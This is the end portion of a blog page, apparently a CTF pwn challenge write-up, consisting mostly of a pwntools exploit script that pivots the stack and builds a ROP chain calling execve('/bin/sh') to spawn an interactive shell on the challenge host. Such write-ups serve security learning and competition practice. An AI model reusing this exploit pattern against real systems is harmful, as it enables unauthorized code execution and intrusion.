<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        <span class="keyword">return</span> pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pwn.process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span></span><br><span class="line">    io = pwn.connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        pwn.gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py</span></span><br><span class="line"><span class="string">b* 0x402036</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 000000000048ac90    80 FUNC    GLOBAL DEFAULT    7 _dl_make_stack_executable</span></span><br><span class="line"><span class="comment"># 0x0000000000422930 : add rsp, 0x10 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00000000004126e3 : call qword ptr [rax]</span></span><br><span class="line"><span class="comment"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000405121 : xchg eax, esp ; ret</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&quot;wwwwww&quot;</span></span><br><span class="line">pld += <span class="string">b&quot;A&quot;</span>*(<span class="number">0x1000</span>-<span class="number">16</span>) + pwn.p64(<span class="number">0x0000000000405121</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Enter text: &quot;</span>, pld)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000045a8f7 : pop rax ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000404cfe : pop rsi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004018da : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004017df : pop rdx ; ret</span></span><br><span class="line"><span class="comment"># 0x000000000045684f : mov qword ptr [rdi], rsi ; ret</span></span><br><span class="line"></span><br><span class="line">DATA_SEC = <span class="number">0x0000000004c90e0</span></span><br><span class="line">POP_RDI = <span class="number">0x00000000004018da</span></span><br><span class="line">POP_RSI = <span class="number">0x0000000000404cfe</span></span><br><span class="line">POP_RAX = <span class="number">0x000000000045a8f7</span></span><br><span class="line">POP_RDX = <span class="number">0x00000000004017df</span></span><br><span class="line">MOV_PTR_RDI_RSI = <span class="number">0x000000000045684f</span></span><br><span class="line">SYSCALL = <span class="number">0x00000000004012e3</span> <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">pld = pwn.p64(POP_RDI)</span><br><span class="line">pld += pwn.p64(DATA_SEC)</span><br><span class="line">pld += pwn.p64(POP_RSI)</span><br><span class="line">pld += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">pld += pwn.p64(MOV_PTR_RDI_RSI)</span><br><span class="line">pld += pwn.p64(POP_RSI)</span><br><span class="line">pld += pwn.p64(<span class="number">0x0</span>)</span><br><span class="line">pld += pwn.p64(POP_RDX)</span><br><span class="line">pld += pwn.p64(<span class="number">0x0</span>)</span><br><span class="line">pld += pwn.p64(POP_RAX)</span><br><span class="line">pld += pwn.p64(<span class="number">0x3b</span>)</span><br><span class="line">pld += pwn.p64(SYSCALL)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Enter text: &quot;</span>, pld)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/posts/cloudinspect/"
      title="[Hack.lu 2021 - pwn] Cloudinspect"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        [Hack.lu 2021 - pwn] Cloudinspect
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/posts/mipsy/"
      title="[FCSC 2021 - pwn] Itsy Mipsy router"
     >

    <p class="title-text">
      
        [FCSC 2021 - pwn] Itsy Mipsy router
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 nasm<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
        <span class="material-symbols-rounded">keyboard_arrow_up</span>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.style.opacity = 1;
        } else {
            btn.style.opacity = 0;
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
